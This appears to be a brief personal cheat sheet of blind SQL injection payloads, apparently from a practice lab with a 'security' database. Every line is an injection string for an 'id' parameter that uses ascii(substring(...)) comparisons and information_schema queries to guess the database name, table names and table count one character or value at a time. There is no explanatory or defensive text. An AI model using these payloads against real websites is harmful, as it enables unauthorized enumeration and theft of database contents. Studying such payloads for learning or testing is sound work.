# blind

id=1 and ascii\(substring\(database\(\),1,1\)\)&gt;100 --%20

?id=1' and \(select table\_name from information\_schema.tables where table\_schema='security' limit 0,1\)='emails' --%20  
OR  
?id=1' and ascii\(substring\(\(select table\_name from information\_schema.tables where table\_schema='security' limit 0,1\)\),1,1\)&gt;120 --%20

?id=1' and \(select count\(\*\) from information\_schema.tables where table\_schema='security'\)=3 --%20

